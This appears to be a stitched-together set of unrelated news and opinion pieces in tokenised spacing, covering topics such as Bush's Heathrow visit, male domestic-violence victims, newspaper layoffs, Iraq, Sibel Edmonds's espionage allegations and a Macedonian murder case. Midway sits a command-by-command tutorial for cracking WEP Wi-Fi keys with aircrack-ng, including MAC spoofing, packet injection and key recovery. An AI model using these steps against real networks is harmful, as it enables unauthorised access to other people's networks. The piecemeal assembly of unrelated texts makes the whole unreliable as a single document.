British Airways has criticised Heathrow owner BAA for allowing George Bush to fly into the UK's biggest airport , forcing the cancellation of at least 69 flights and disrupting the travel plans of 40,000 passengers .
Willie Walsh , BA chief executive , said he was angry that the presidential entourage , which included two Boeing 747 jets and four helicopters , caused chaos 10 days ago as runways were closed and planes grounded .
" The decision to allow President Bush and his fleet of aircraft to fly into Heathrow rather than a military base was one all of Heathrow 's users could have done without , " he said .
" I am also angry that this was allowed . "
Walsh said the disruption began two days before the president 's visit on June 15 and lasted for the two days that his party stayed in the UK .
Heathrow was reduced to one working runway for 30 minutes on June 15 and 16 , after its other runway was closed temporarily for the arrival and departure of Air Force One .
According to BA , there was a ban on departing flights on two separate occasions as the president arrived , leading to knock - on delays that lasted six hours .
A rehearsal on the preceding Friday , when two helicopters landed at Heathrow , caused similar delays , BA said .
Walsh blamed the disruption on the size of the entourage and US security requirements .
BA , Heathrow 's biggest customer , said it had cancelled 53 short - haul flights while more than 260 flights were delayed by more than 30 minutes , affecting 38,000 passengers .
BAA admitted a further 16 flights from other airlines were cancelled for the duration of the president 's visit .
But it defended its decision to allow Air Force
One to land , saying Heathrow was the best port of entry for the party , given an itinerary that included a dinner at Windsor Castle , while the airport offers a high level of security , acquired through many years of handling VIPs .
Writing to BA staff in the airline 's in - house newspaper , Walsh said the carrier was well used to disruption at the airport , but what was different on this occasion was that the delays were " completely unnecessary " .
BA has endured one of its worst ever years at Heathrow , after the disastrous opening of Terminal 5 forced the cancellation of more than 500 flights and heaped bad publicity on the airline .
However , the £ 4.3 bn building has been working smoothly since then .
Ruth Kelly , the transport secretary , is expected to reiterate calls for a third runway at Heathrow tomorrow when a report is published on the causes of delays and cancellations .
BA and BAA claim disruption is common because its two runways operate at capacity , leaving no room for recovery if freak weather , security scares or a presidential visit upset flight schedules .
Four out of 10 Heathrow flights are late , with an average delay of 25 minutes .
A BAA spokesman said : " BAA , the airlines and other business partners at Heathrow did everything in their power to minimise disruption at the airport during George Bush 's presidential visit .
Despite our best efforts , some disruption did occur , for which we apologise to passengers affected . "
Growing Up With a Problem That Does n’t Exist By Mark B. Rosenthal
“ You ’re disgusting , just like your mother .
Why do n’t you go join her ? ”
My mother spat the words at my father .
Though spoken many decades ago , those words still ring in my ears .
He had loved his mother very much , had agonized as her health had deteriorated , and now that she had passed away , he missed her .
What could possibly hurt him more than just attacking her memory ?
Why , wishing him dead too .
When newspapers and TV tell us about domestic violence , the storyline invariably goes like this : man = brute , woman and children = innocent victims .
Families like the one I grew up in are rendered invisible by the media .
And predictably , social policy becomes based on media stereotypes rather than reality .
My mother ’s attacks went beyond emotional devastation .
Though her weight of 100 lbs. was no match for my father ’s 170 lbs. , he never responded with violence .
And secure in the knowledge that he never would , she kicked and punched him with impunity .
One incident in particular sticks in my mind .
My father had chosen paint for the kitchen that was a shade too dark .
My mother started out by insulting him , then yelling .
As her rage grew she escalated to hitting him in the face with her fists .
I watched him raise his hands , not to strike back , but merely to protect his eyes .
But she was n’t expecting it and her hand must have hit a bony part of his wrist .
She immediately stopped , and then started whimpering , “ You hurt me ! ”
My father was not my mother ’s only target .
I was a small child when she shook me by the shoulders while my head hit the wall .
But spending our entire childhoods walking on eggshells to avoid her wrath was even more destructive to us children than physical attacks .
All of us , including my father , were driven to suicidal depression .
After several attempts , my sister did take her own life .
The only help we children would have accepted was from the parent we looked to for safety – our father .
A system that helped domestic violence victims without regard to gender could have saved my sister ’s life by helping our father , but at that time no help was available to anyone .
Sadly , the system in place today is even worse than when no help was available .
I ’ve asked police and social workers what would happen today if they answered a call similar to my parents ’ situation .
What would they do if they found an uninjured woman whimpering , “ He hurt me ! ” and a man almost twice her size saying that he had merely covered his face and she ’d hurt herself trying to punch him in the eye .
The police officers and social workers I ’ve asked have confirmed this would be their response : the male victim would be removed from the house and probably put in jail for domestic violence .
Since zero - tolerance policies were adopted a few years ago , zero - tolerance has too often become a zero- intelligence “ arrest - the - man - regardless - of - the - facts ” policy .
If current policies had been applied to the family of my childhood , it would have given the abuser total control over us children and prevented our father from protecting us .
Meanwhile , the various players in the system would be congratulating themselves on having protected a victimized woman – when in actuality they had rewarded the true abuser and worsened the situation , virtually guaranteeing the suicide of my sister , and making it much more likely that I too would eventually commit suicide .
For decades now , the media has exhibited a dogged determination to pretend that male victims and female abusers simply do n’t exist .
Failing that , reporters and editors give these victims what Noam Chomsky calls the “ unworthy victim ” treatment , refusing to humanize the victim or provide any details of their victimization that might generate sympathy from the reader .
As a child , I thought my family was the only one where these things happened .
As an adult , I ’ve learned that there are countless families just like the one I grew up in .
I now feel lucky to have grown up during a time when domestic violence was unrecognized , simply because the public ’s perception of the issue had n’t yet become distorted .
Today we penalize domestic violence victims who do n’t happen to fit the approved stereotype .
I mourn for children of abused fathers who have the misfortune to be growing up in these “ more enlightened ” times .
And I long for the day when society stops mistaking bias for enlightenment and offers men who need help the same compassion that currently is reserved for women only .

After a spate of closures and layoffs in the latter part of the last decade , the newspaper industry appeared to find its footing over the past few years .
But now that oasis of stability may be drying up .
Hard times are hitting some of the most resilient titles , and the trend indicates that things are only get worse .
The decline in print advertising revenue at The New York Times has accelerated from 9 percent in the first quarter of 2016 to nearly 19 percent in the most recent quarter , writes Mathew Ingram in a Fortune story ominously headlined “ The New York Times Scrambles to Avoid Print Advertising Cliff . ”
In announcing its financial results , the paper said it expects the falloff to continue “ at a rate similar to that seen in the third quarter , ” or at least 19 % per quarter .
The only good news in that statement is that sequential 20 % declines take a smaller total dollar bite out of revenues with each iteration because the base number is smaller .
But that ’s the only good news .
If the last three quarters are any indication , the Times advertising business is in free - fall .
The paper has done a better job than anyone of growing its base of circulation revenue and increasing its digital advertising business , but both pale in comparison to the size – and profitability – of the print advertising business .
Almost in tandem with the Times ’ disappointing financial results , The Wall Street Journal announced that it will consolidate sections and lay off staff as it seeks to stabilize its print business while it scrambles to grow its digital operations .
Last week , the Journal laid off the staff of its “ Greater New York ” section and offered buyouts to 450 employees .
Only 48 took the package , indicating that things could get ugly soon .
A new “ Business & Finance ” section will combine the Journal ’s current “ Business & Tech ” and “ Money & Investing ” sections , Reuters reports .
New York coverage will be reduced and moved into the main section of the newspaper .
The Journal has proved more resilient to the downturn than most print newspapers because of its pricey subscriptions and well - heeled readership .
When the most optimistic statement management can make is that the paper is seeking to create a “ print edition that can stand on a sound financial footing for the foreseeable future , ” that does n’t sound good .
Speaking of Reuters , the company completed this week ’s morbid hat trick by announcing that it will lay off about 2,000 workers at a cost of $ 250 million as part of a “ transformation ” of its business .
The silver lining – journalistically speaking – is that Reuters said none of the cuts will be in the newsroom .
Instead , they will be focused in financial and technology operations that primarily serve financial services companies .
Things have been tough in that business amid low interest rates and pressure from new - economy competitors .
Reuters has the advantage of being a diversified company with a strong position in financial markets , but revenues are flat and there ’s no indication of where additional business will come from .

The party will display a fake check from “ Exxon & Friends ” to John McCain for $ 2 million , with the notation : “ THANKS FOR STAYING IN THE TANKS FOR BIG OIL . ” | Courtesy DNC launches ' Exxon - McCain ’08 '
Stung by Republican taunts about tire gauges , Democrats are pumping up a stunt of their own .
The Democratic National Committee on Wednesday is launching an “ Exxon - McCain ’ 08 ” campaign , complete with a gas - pump logo and garish red buttons , bumper stickers and yard signs .
Advertisement
The party is opening a Web site where campaign “ chum ” will be available for download , and the goodies will be distributed to state parties and organizers nationwide .
The fantasy presidential campaign is a rebuke to the Republican National Committee for tire gauges labeled “ Obama ’s Energy Plan ” that were distributed to campaign reporters this week .
And it reinforces a new ad by Barack Obama in which the announcer says : “ Oil 's filling John McCain 's campaign with 2 million dollars in contributions .
Maryland Gov. Martin O’Malley will announce the campaign at DNC headquarters in Washington .
“ The oil industry was so generous with its campaign largesse , ” a party official says , “ John McCain has not only put Exxon on the ticket — but he has graciously stepped aside and is allowing Exxon ... to run at the top of the ticket . "
If the governor needs to check his tires , he can stop off at the RNC , a couple of blocks away .
RNC spokesman Alex Conant replied : “ The $ 2.8 billion that Obama gave the oil companies in the '05 energy bill would have bought a lot of tire gauges . ”
With more than 500 parties or candidates already registered for the provincial vote , the real test of Iraqi politics will be the fairness of the votes and the ability of the government to deliver services to its citizens , the latter a sore issue for many Iraqis .
Ultimately , all politics is local .
In Qadisiya , there remained bitter feelings about the abandonment of tribal empowerment .
Sheik Taklef told me that the governor and the Supreme Council had done little to improve services in the city .
“ These people do n’t serve the interests of the Iraqis , ” he said .
“ They wanted everything to go through them . ” Muhammad Abdul Amir al - Shalan , sheik of the al - Aghrah tribe , agreed , saying , “ There is no big local support for the governor and the Supreme Council .
The services are worse now than they were before them .
They are not competent .
People are no longer supporting them . ”
But Khudari , the governor , casts the sheiks as little more than braggarts profiteering off the Iraqi Army ’s success .
“ We do n’t think that there is a necessity to form Awakening councils here , ” he said .
“ The tribes did n’t confront the terrorists ; the local and federal governments did . ”
Othman insisted that he had not worried about political pressure from Khudari but that it became impossible to push harder for the Awakening program when even the American command did not put its full weight behind the venture .
Gildroy reported , however , that in her farewell meeting with Othman , he did seem to be wondering about how well he really fit into the new Iraq .
On July 16 , Qadisiya Province was officially transferred to Iraqi government control .
The American Embassy issued a statement congratulating the government but hinting at the tensions below the surface .
“ The United States and Multinational Force - Iraq congratulate the Government of Iraq on this important milestone , ” the statement said .
“ The provincial and military leadership in Qadisiya will have to work cooperatively in order to attain the sustainable security necessary for long - term economic prosperity . ”
There were tensions on the American side , too .
The perspective of the Marines differed markedly from that of the American officials in Baghdad .
The Marines saw the tribes as more secular than the fundamentalists in the religious parties .
They were less confident that the provincial elections would be genuinely fair ; and they were worried that efforts to buttress political stability appeared to have trumped the idea of democracy .
After Diwaniya , Team Phoenix made trips to Sadr City and Basra : they concluded that much of the security there was the result of political deals , not the decisive application of force by the Iraqi state .
And they wondered if those deals would hold .
Lemons , who is back at work at his skateboard company , had strong and unsettled feelings about his time in Diwaniya .
“ I am still trying to figure out the lesson , ” he said .
“ Maybe the lesson is there are limits to what we can and cannot do in Iraq .
I ’ve tried separating myself from our work with the Sahawa ”  Awakening  “ and I can ’t .
I ca n’t ever face the tribes I worked with again because I broke a lot of promises .
Those promises do n’t mean much to anyone outside Diwaniya or to an overall strategy for this war , but I thought these were the promises my own government had sent me year after year to pursue .
So while I would deploy again for my Marines and my Iraqi Army comrades , I do n’t want to go to Iraq again if this is the way we do business . ”
Gildroy , who is once again a civilian and who left Diwaniya vowing never to return , says she still believes Petraeus ’s counterinsurgency strategy is producing results .
“ This war is critical to our national - security interests and has had an impact on Al Qaeda .
I know we are creating a buffer zone , ” she said .
“ We will not create a well - functioning democracy in Iraq , but we need to leave the region and Iraq in a stronger position than we went in both for their own security and to avoid another terrorist attack on America .
I would do whatever General Petraeus asked or needed .
I trust him and his character with my life . ”
Moulton , who is headed to graduate school this year at Harvard for a joint program in business and government , said the episode illuminates both the importance of the south for the politicians in Baghdad and the brittleness of many of the gains .
“ Together with some brave young Polish and Iraqi soldiers , we did a lot to improve life in Diwaniya , ” he said .
“ I ca n’t deny that .
People were afraid to leave their houses when we arrived .
Iraqis were crying when we left .
But so much of what we did fell apart so quickly .
It shows how fragile everything is today in Iraq .
For all that we put into it , not least of all a year of our lives , I do n’t know if any of it will last . ”

Accessing WIFI networks that do not belong to you is ILLEGAL .
This article will explan how to crack 64bit and 128 bit WEP on many WIFI access points and routers using Backtrack , a live linux distribution .
Your mileage may very .
The basic theory is that we want to connect to an Access Point using WEP Encryption , but we do not know the key .
We will attack the wifi router , making it generate packets for our cracking effort , finally cracking the WEP key .
I have tested this technique on an IBM Thinkpad x60 and Acer 5672 and the WIFI Chipset in those machines work for sure .
Requirements :
I will assume that you have downloaded and booted into Backtrack 3 .
If you have n’t figured that part out , you probably should n’t be trying to crack WEP keys .
Once Backtrack is loaded , open a shell and do the following :
Preparing The WIFI Card
First we must enable “ Monitor Mode ” on the wifi card .
If using the Intel® PRO / Wireless 3945 ABG chipset issue the following commands :
modprobe -r iwl3945
modprobe ipwraw
The above commands will enable monitor mode on the wireless chipset in your computer .
Next we must stop your WIFI card :
iwconfig
Take note of your wireless adapter ’s interface name .
Then stop the adapter by issuing :
airmon -ng stop [ device ]
Then :
ifconfig down [ interface ]
Now we must change the MAC address of the adapter :
macchanger --mac 00:11:22:33:44:66 [ device ]
Its now time to start the card in monitor mode by doing :
airmon -ng start [ device ]
Attacking The Target
It is now time to locate a suitable WEP enabled network to work with :
airodump - ng [ device ]
Be sure to note the MAC address ( BSSID ) , channel ( CH ) and name ( ESSID ) of the target network .
Now we must start collecting data from the WIFI access point for the attack :
airodump - ng -c [ channel ] -w [ network.out ] -- bssid [ bssid ] [ device ]
The above command will output data collected to the file : network.out .
This file will be fed into the WEP Crack program when we are ready to crack the WEP key .
Open another shell and leave the previous command running .
Now we need to generate some fake packets to the access point to speed up the data output .
Test the access point by issuing the following command :
aireplay - ng - 1 0 - a [ bssid ] -h 00:11:22:33:44:66 -e [ essid ] [ device ]
If this command is successful we will now generate many packets on the target network so that we can crack the KEY .
Type :
airplay - ng - 3 - b [ bssid ] -h 00:11:22:33:44:66 [ device ]
This will force the access point to send out a bunch of packets which we can then use to crack the WEP key .
Check your aerodump - ng shell and you should see the “ data ” section filling up with packets .
After about 10,000 - 20,000 you can begin cracking the WEP key .
If there are no other hosts on the target access point generating packets , you can try :
aireplay - ng - 2 -p 0841 -c FF : FF : FF : FF : FF : FF -b [ bssid ] -h 00:11:22:33:44:66 [ device ]
Once you have enough packets , you begin the crack :
aircrack - ng -n 128 - b [ bssid ] [ filename ] -01.cap
The “ - n 128 ” signifies a 128 - bit WEP key .
If cracking fails , try a 64 - bit key by changing the value of N to 64 .
Once the crack is successful you will be left with the KEY !
Remove the : from the output and there is your key .
So there you have it .
You can use these techniques to demonstrate to others why using WEP is a bad idea .
I suggest you use WPA2 encryption on your wireless networks .
Goodluck !
A Whistleblower has made a series of extraordinary claims about how corrupt government officials allowed Pakistan and other states to steal nuclear weapons secrets .
Sibel Edmonds , a 37 - year - old former Turkish language translator for the FBI , listened into hundreds of sensitive intercepted conversations while based at the agency 's Washington field office .
She approached The Sunday Times last month after reading about an Al - Qaeda terrorist who had revealed his role in training some of the 9/11 hijackers while he was in Turkey .
Edmonds described how foreign intelligence agents had enlisted the support of US officials to acquire a network of moles in sensitive military and nuclear institutions .
Among the hours of covert tape recordings , she says she heard evidence that one well - known senior official in the US State Department was being paid by Turkish agents in Washington who were selling the information on to black market buyers , including Pakistan .
The name of the official ­ who has held a series of top government posts ­ is known to The Sunday Times .
He strongly denies the claims .
However , Edmonds said : " He was aiding foreign operatives against US interests by passing them highly classified information , not only from the State Department but also from the Pentagon , in exchange for money , position and political objectives . "
She claims that the FBI was also gathering evidence against senior Pentagon officials ­ including household names ­ who were aiding foreign agents .
" If you made public all the information that the FBI have on this case , you will see very high - level people going through criminal trials , " she said .
Her story shows just how much the West was infiltrated by foreign states seeking nuclear secrets .
It illustrates how western government officials turned a blind eye to , or were even helping , countries such as Pakistan acquire bomb technology .
The wider nuclear network has been monitored for many years by a joint Anglo - American intelligence effort .
But rather than shut it down , investigations by law enforcement bodies such as the FBI and Britain 's Revenue & Customs have been aborted to preserve diplomatic relations .
Edmonds , a fluent speaker of Turkish and Farsi , was recruited by the FBI in the aftermath of the September 11 attacks .
Her previous claims about incompetence inside the FBI have been well documented in America .
She has given evidence to closed sessions of Congress and the 9/11 commission , but many of the key points of her testimony have remained secret .
She has now decided to divulge some of that information after becoming disillusioned with the US authorities ' failure to act .
One of Edmonds 's main roles in the FBI was to translate thousands of hours of conversations by Turkish diplomatic and political targets that had been covertly recorded by the agency .
A backlog of tapes had built up , dating back to 1997 , which were needed for an FBI investigation into links between the Turks and Pakistani , Israeli and US targets .
Before she left the FBI in 2002 she heard evidence that pointed to money laundering , drug imports and attempts to acquire nuclear and conventional weapons technology .
" What I found was damning , " she said .
" While the FBI was investigating , several arms of the government were shielding what was going on . "
The Turks and Israelis had planted " moles " in military and academic institutions which handled nuclear technology .
Edmonds says there were several transactions of nuclear material every month , with the Pakistanis being among the eventual buyers .
" The network appeared to be obtaining information from every nuclear agency in the United States , " she said .
They were helped , she says , by the high - ranking State Department official who provided some of their moles ­ mainly PhD students ­ with security clearance to work in sensitive nuclear research facilities .
These included the Los Alamos nuclear laboratory in New Mexico , which is responsible for the security of the US nuclear deterrent .
In one conversation Edmonds heard the official arranging to pick up a $ 15,000 cash bribe .
The package was to be dropped off at an agreed location by someone in the Turkish diplomatic community who was working for the network .
The Turks , she says , often acted as a conduit for the Inter - Services Intelligence ( ISI ) , Pakistan 's spy agency , because they were less likely to attract suspicion .
Venues such as the American Turkish Council in Washington were used to drop off the cash , which was picked up by the official .
Edmonds said : " I heard at least three transactions like this over a period of 212 years .
There are almost certainly more . "
The Pakistani operation was led by General Mahmoud Ahmad , then the ISI chief .
Intercepted communications showed Ahmad and his colleagues stationed in Washington were in constant contact with attachés in the Turkish embassy .
Intelligence analysts say that members of the ISI were close to Al - Qaeda before and after 9/11 .
Indeed , Ahmad was accused of sanctioning a $ 100,000 wire payment to Mohammed Atta , one of the 9/11 hijackers , immediately before the attacks .
The results of the espionage were almost certainly passed to Abdul Qadeer Khan , the Pakistani nuclear scientist .
Khan was close to Ahmad and the ISI .
While running Pakistan 's nuclear programme , he became a millionaire by selling atomic secrets to Libya , Iran and North Korea .
He also used a network of companies in America and Britain to obtain components for a nuclear programme .
Khan caused an alert among western intelligence agencies when his aides met Osama Bin Laden .
" We were aware of contact between A Q Khan 's people and Al - Qaeda , " a former CIA officer said last week .
" There was absolute panic when we initially discovered this , but it kind of panned out in the end . "
It is likely that the nuclear secrets stolen from the United States would have been sold to a number of rogue states by Khan .
Edmonds was later to see the scope of the Pakistani connections when it was revealed that one of her fellow translators at the FBI was the daughter of a Pakistani embassy official who worked for Ahmad .
The translator was given top secret clearance despite protests from FBI investigators .
Edmonds says packages containing nuclear secrets were delivered by Turkish operatives , using their cover as members of the diplomatic and military community , to contacts at the Pakistani embassy in Washington .
Following 9/11 , a number of the foreign operatives were taken in for questioning by the FBI on suspicion that they knew about or somehow aided the attacks .
Edmonds said the State Department official once again proved useful .
" A primary target would call the official and point to names on the list and say , ' We need to get them out of the US because we can't afford for them to spill the beans ' , " she said .
" The official said that he would ' take care of it ' . "
The four suspects on the list were released from interrogation and extradited .
Edmonds also claims that a number of senior officials in the Pentagon had helped Israeli and Turkish agents .
" The people provided lists of potential moles from Pentagon - related institutions who had access to databases concerning this information , " she said .
" The handlers , who were part of the diplomatic community , would then try to recruit those people to become moles for the network .
The lists contained all their ' hooking points ' , which could be financial or sexual pressure points , their exact job in the Pentagon and what stuff they had access to . "
One of the Pentagon figures under investigation was Lawrence Franklin , a former Pentagon analyst , who was jailed in 2006 for passing US defence information to lobbyists and sharing classified information with an Israeli diplomat .
" He was one of the top people providing information and packages during 2000 and 2001 , " she said .
Once acquired , the nuclear secrets could have gone anywhere .
The FBI monitored Turkish diplomats who were selling copies of the information to the highest bidder .
Edmonds said : " Certain greedy Turkish operators would make copies of the material and look around for buyers .
They had agents who would find potential buyers . "
In summer 2000 , Edmonds says the FBI monitored one of the agents as he met two Saudi Arabian businessmen in Detroit to sell nuclear information that had been stolen from an air force base in Alabama .
She overheard the agent saying : " We have a package and we 're going to sell it for $ 250,000 . "
Edmonds 's employment with the FBI lasted for just six months .
In March 2002 she was dismissed after accusing a colleague of covering up illicit activity involving Turkish nationals .
She has always claimed that she was victimised for being outspoken and was vindicated by an Office of the Inspector General review of her case three years later .
It found that one of the contributory reasons for her sacking was that she had made valid complaints .
The US attorney - general has imposed a state secrets privilege order on her , which prevents her revealing more details of the FBI 's methods and current investigations .
Her allegations were heard in a closed session of Congress , but no action has been taken and she continues to campaign for a public hearing .
She was able to discuss the case with The Sunday Times because , by the end of January 2002 , the justice department had shut down the programme .
The senior official in the State Department no longer works there .
Last week he denied all of Edmonds 's allegations : " If you are calling me to say somebody said that I took money , that 's outrageous . . .
I do not have anything to say about such stupid ridiculous things as this . "
In researching this article , The Sunday Times has talked to two FBI officers ( one serving , one former ) and two former CIA sources who worked on nuclear proliferation .
While none was aware of specific allegations against officials she names , they did provide overlapping corroboration of Edmonds 's story .
One of the CIA sources confirmed that the Turks had acquired nuclear secrets from the United States and shared the information with Pakistan and Israel .
" We have no indication that Turkey has its own nuclear ambitions .
But the Turks are traders .
To my knowledge they became big players in the late 1990s , " the source said .

The Plans
Remember back in the old days when we used to fret about how girls were n’t doing as well in school as guys were , especially in math and science ?
Ah , that seems so last century .
Gender gap ?
What gender gap ?
That ’s the message in a new study by five professors at the University of Wisconsin - Madison and the University of California , Berkeley .
Although other studies have found similar results , this one is the most sweeping .
Comparing math test scores of 7 million students in 10 states from 2005 to last year , it found girls and boys do equally well .
Alas , the news comes too late to help former Harvard President Lawrence Summers .
Back in 2005 the National Organization for Women , among other enraged parties , called for Mr. Summers to resign , which he eventually did .
He had suggested at a conference that “ innate ” differences between the sexes should be seriously investigated among other possible reasons for the shortage of women in the upper ranks of math and science academia and professions .
He later apologized , saying he did not mean to suggest women were incapable of matching or surpassing men in math and science .
Nor had he ever said that women could n’t add and subtract - although , through the shorthand of daily journalism , that ’s how a lot of people heard him .
What he actually said has been backed up by various studies , including the latest one : Boys are likelier than girls to arrive at the very highest and the very lowest math scores .
Girls are more likely than boys to score well overall and arrive in the top 5 percent of math scores , although boys are more likely than girls to make it to the top 1 percent .
Given time , the young women may well crack that barrier , too .
The more troubling question in many minds - including mine - is what ’s happening to the guys , especially the underachievers piling up at the bottom end of the grading and test scores ?
While some boys ’ scores have never looked better , others could hardly be doing worse .
The days of fretting over lagging girls ’ achievement have faded into a “ boy crisis ” headlined on the covers of Time and Newsweek and numerous new books .
Stories and statistics describe unmotivated , easily distractible boys who are falling behind in test scores , forgetting their homework or , when they finish it , forgetting to turn it in - or unable to find it in their disorganized backpacks .
When their grades slip back and their adolescent concepts of manhood are crushed , they would retreat to video games or even less productive escapes , rather than ask for help .
These problems are particularly acute for black males , judging by studies like the recent report on dropouts by the Schott Foundation for Public Education , an educational think tank in Cambridge , Mass .
It found that fewer than half of black male students across the country are graduating from high school .
What can be done ?
John Jackson , president and chief executive officer of the Schott Foundation , called the dropout rate a national problem that shows up when students do n’t have access to “ highly effective teachers , early childhood education , college - bound curriculum and equal instructional materials ” to match those of better - off school districts .
“ Black students are performing the best in states like North Dakota and Vermont where there are the fewest black students , ” he said .
“ Alternatively , where white males are trapped in underresourced schools like Indianapolis and Detroit , they performed as poorly or worse than black males . ”
We also know from research that boys perform poorest in areas where more of them are raised without strong male role models at home .
With growing numbers of boys of all races growing up without fathers at home because of divorce , separations and out - of - wedlock births , more boys need more male mentors , even as studies show boys are less likely than girls to ask for any kind of help .
Every child learns differently .
Boys tend to learn in ways quite different from the ways of girls .
Some experiments in school choice and single - gender education are beginning to show results , at least in some happy individual cases , although experts continue to debate the overall statistical results .
As a result , the academic “ boy crisis ” is another political minefield like the one into which Mr. Summers scampered .
Organizations like the American Association of University Women , which first alerted the world to an academic gender gap two decades ago , call the crisis a “ myth ” that may only be a thinly disguised backlash against the advances women and girls have made .
But advances for boys and girls do n’t have to be an either / or situation .
Why ca n’t we have both ?
Before we lose another generation , we need to look for ways that can help both sexes without penalizing either one .

Three years after Huntington Beach police raided Jim Spray 's one - man pot - growing operation , they returned the four ounces of medical marijuana and a small amount of hashish they confiscated because a judge ruled it should n't have been seized in the first place , the OC Register reports :
" That 's a chunk of hash , " said Spray , a 52 - year - old trade show decorator from Huntington Beach .
A tall , stocky police official watched as the medical marijuana patient inspected a tiny , eye shadow - sized container full of hashish .
" It 's still good .
I almost forgot about all this , " said Spray , who uses medical marijuana because of pain from a herniated disc .
( Skip )
The order came nearly nine months after the 4th District Court of Appeal ruled that the city must return Spray 's marijuana and equipment taken from his home in November 2005 .
Spray was represented by attorneys with medical marijuana advocacy group Americans for Safe Access .
It 's the second time the Huntington Beach police have had to return pot to its owner .
Six months ago , a court ruling forced them to give back the Purple Urkel taken from Dave Lucas .
Though California allows the use of medical marijuana , federal law does n't .
Between growing clubs and pot dispensaries , it 's a legal netherworld that Jerry Brown , California 's attorney general , has tried to address with new guidelines .
And that pot farm in the photo ?
Legal .
For now .

If , someday , there are T - shirts sold in Iraq that read , " the United States invaded our country and all we got were these crappy tanks , " here is the explanation for what happened .
In 2005 , Defense Solutions ( the Pennsylvania - based arms dealer that employs former Congressman Curt Weldon ) got itself a contract to refurbish Soviet - era T - 72 tanks for the Iraqi government .
But the deal , for decades - old equipment , included terms so lopsided , they likely would have been illegal under U.S. law .
The essence of Defense Solutions ' proposal was to arrange a donation of of some 77 Hungarian - owned T - 72s .
The Hungarians were likely happy to unload the outdated tanks for free , and the Iraqi government would pay Defense Solutions to refurbish them .
That sounds fine , except the contract was what many might consider a sweetheart deal .
The contract appears to be a " cost plus percentage of cost fee " agreement , meaning Defense Solutions was essentially guaranteed a profit regardless of what condition the tanks were in or how much it cost to get them running ( a copy of the contract [ .pdf ] was provided to Danger Room ) .
Defense Solutions estimates the cost to refurbish the tanks at about $ 3.2 million , and the company is entitled to a fee based on 8 percent of the costs .
If the contract goes 75 percent over cost , Defense Solutions must notify the Iraqis , but that amount " will not act as a ceiling on the actual price of performance , " the contract states .
Under typical U.S. defense contracts , fees are tied to performance ( thus giving the contractor an incentive to keep costs down ) .
Defense Solutions gets its fee , regardless .
And with an 8 percent fee , the more you spend , the more you earn .
This would be a most unusual arrangement , at least in the United States , where cost plus percentage - of - cost contracts are prohibited under U.S. law .
As federal acquisition regulations state quite clearly : " The cost - plus - a - percentage - of - cost system of contracting shall not be used ( see 10 U.S.C. 2306 ( a ) and 41 U.S.C. 254 ( b ) ) . "
The Pentagon 's Defense Acquisition University 's " ask a professor " website sums up the obvious reason for this prohibition : " A cost plus percentage of cost type arrangement would encourage the contractor to experience as much cost as possible to receive a greater amount of fee . "
Why would Iraq agree to such a contract ?
It 's not clear , but Ziad Cattan , the man the United States chose to oversee Iraq 's defense procurement , signed the contract .
As the LA Times reported , Cattan , has since been accused of massive corruption , much it involving no -bid contracts for Soviet - era equipment .
So , what happened to the tanks ?
Well , the Soviet - era tanks had been sitting in storage for about one or two decades , Defense Solutions states in its progress report .
( Copies of the documents were provided to Danger Room ; the pictures above and below are taken from them . )
Problems , not surprisingly , started on day one .
In one of its initial reports on the contract , Defense Solutions stated : " As of this date , seven tanks still have not started and therefore the checks could not yet be made . "
Nonetheless , things were not that bad , the company asserted : " Overall , I believe that the tanks are in good condition considering that they were laid up for 10 to 20 years .
Electrical problems on 24 - volt systems are certainly expected due to moisture and corrosion .
Hydraulic seals dry out and rubber dry rots .
At this point , we think we can still meet the contract deadlines . "
A few weeks later , however , the reports from Defense Solutions indicated more problems .
" [ T ] he running test could not be performed on three tanks due to transmission problems .
These units are still being troubleshot , " a progress report from the company stated .
" The number of tanks needing new engine head gaskets is now two .
I believe the most costly repairs will likely be to the sighting systems .
On one of the tanks , the torsion bar is bad , and there is a photo of a mechanic being able to turn the wheel with a pike , indicating that there is no weight on the wheel . "
By July 8 , 2005 , the company was blaming the Iraqis for the tank problems .
" We are at a crossroads on this project , " the Defense Solutions report reads .
" If we do not get decisions regarding repairs which are above and beyond those envisioned when the contract was signed , we will have great difficulty in meeting the contract deadline . "
More and more parts , such as fans , exhaust adapters and mud flaps were found missing from the tanks , and the price to replace them was growing .
Because the contract was cost plus fee , the Iraqis ' only choice was presumably to pay the additional costs , relying on whatever cost estimates Defense Solutions provided .
So , for example , in one progress report , Defense Solutions quotes a price of $ 824 per tank for ventilation fans .
Is that too much to pay ?
Who knows , because that 's the cost Defense Solutions quoted .
The report concludes with this final note : " Finally , some information I reported in the activity report of June 24 was inaccurate .
I had indicated that , with the spare parts just received , we could get more than 50 fire control systems working with minimal costs .
It now seems that the donated parts did not contain the items needed to allow for the repair of these fire control systems . "
Danger Room e-mailed Defense Solutions CEO
Timothy Ringgold to ask him about the tank contract , but we have n't heard back yet .
It 's unclear what the final status of these 77 tanks is , but in 2006 , Defense Solutions cited the contract as being successfully completed .
The total cost to Iraq to refurbish the decades - old tanks ?

· Journalist kills himself as he is linked to four deaths · Police suspicion raised by use of unattributable facts
When Vlado Taneski wrote about the serial killer stalking his hometown in Macedonia , his eye for detail was such that the story was soon riveting readers .
The journalist 's inside knowledge of the brutal murders of three elderly women in the tiny town of Kicevo ensured that newspaper editors gave his columns prominence .
Yesterday the 56 - year - old father - of - two killed himself by dunking his head in a bucket of water in the toilet at a prison in the town of Tetovo , after it was revealed he had been charged with the murders he had written about .
" All these women were raped , molested and murdered in the most terrible way and we have very strong evidence that Taneski was responsible for all three , " said police spokesman Ivo Kotevski speaking from the capital Skopje .
" In the end there were many things that pointed to him as a suspect and led us to file charges against him for two of the murders , " he added .
" We were close to charging him with a third murder , and hoped he would give us details of a fourth woman who disappeared in 2003 - because we believe he was involved in that case , too . "
Of all the things which gave Taneski away , police point to his in - depth coverage of a story which is being reported as one of the most bizarre events to have befallen the two - million strong mini-state .
The three women were aged between 65 and 56 .
Zivana Temelkoska , Ljubica Licoska , and Mitra Simjanoska were each beaten repeatedly and strangled with a phone cable .
Temelkoska was murdered in May , Licoska in February last year and Simjanoska in 2005 .
They shared a common background in being cleaners , a job which Taneski 's deceased mother had held for years .
Each of the three bodies was discovered wrapped in plastic bags and dumped and discarded around Kicevo , a drab town southwest of Skopje with a population of fewer than 20,000 .
The fourth woman , aged 78 , went missing in 2003 , and her body has never been found .
It was the ostensibly mild - mannered journalist 's intricate account of the murders which led to suspicion .
But what made it unmistakable was his inclusion of details police had chosen not to release .
Unlike any of his journalist rivals , Taneski knew the type of phone chord the killer used as his " signature weapon " - reporting , without attribution , that the cord had been used to strangle as well as tie up the bodies of the women ; and , even more brazenly , he speculated about the chronology of the murders .
